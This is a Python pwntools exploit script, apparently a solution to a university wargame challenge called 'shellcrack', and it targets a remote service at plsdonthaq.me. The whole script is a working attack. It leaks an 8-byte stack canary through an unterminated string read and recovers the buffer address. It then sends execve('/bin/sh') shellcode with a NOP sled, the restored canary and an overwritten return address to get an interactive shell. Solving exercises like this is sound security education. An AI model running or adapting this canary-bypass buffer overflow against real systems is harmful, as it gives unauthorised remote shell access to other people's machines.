from pwn import *

p = process("./shellcrack")
p = remote("plsdonthaq.me", 5001)

# Buffer from ebp-0x44 to ebp-0x34 copied to ebp-0x24 to ebp-0x14
# Canary is 8 bytes long at vuln::ebp-0x14 -> ebp-0x6

# the %s expansion will keep going until it hits a null byte
p.recvuntil('Enter as:')
nameStr = "." * 0x10
p.send(nameStr)
p.recvuntil("This is the 6447 wargaming gateway, " + nameStr)

# Get the 8 byte canary
canary = p.recvuntil("!\n", drop=True)[:8]
print(f"Canary is {bytearray(canary)}")

# Get the buffer address
p.recvuntil('Write your data to the buffer[')
buffer = int(p.recvuntil('].\n', drop=True), 16)
# :: buffer = ebp - 0x44
# :: ebp = buffer + 0x44
ebp = buffer + 0x44
print(f"Buffer at {hex(buffer)}")
print(f"vuln::ebp at {hex(ebp)}")

# Pop a shell
assembly = f"""
   push 0x0068732f
   push 0x6e69622f

   mov ebx, esp

   mov eax, 0xb
   mov ecx, 0
   mov edx, 0
   mov esi, 0
   int 0x80
"""

shellCode = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
print(f"Shellcode is {len(shellCode)} bytes long")

payload = b""
payload += shellCode                        # Put the shell code into the buffer
payload += b'\x90' * (0x30 - len(payload))  # Santa's NOP-sled
payload += canary                           # Place back the canary
payload += b'A' * 16                        # Padding to reach the old ebp
payload += p32(buffer)                      # Modify the return address to our shellcode

p.sendline(payload)

p.interactive() 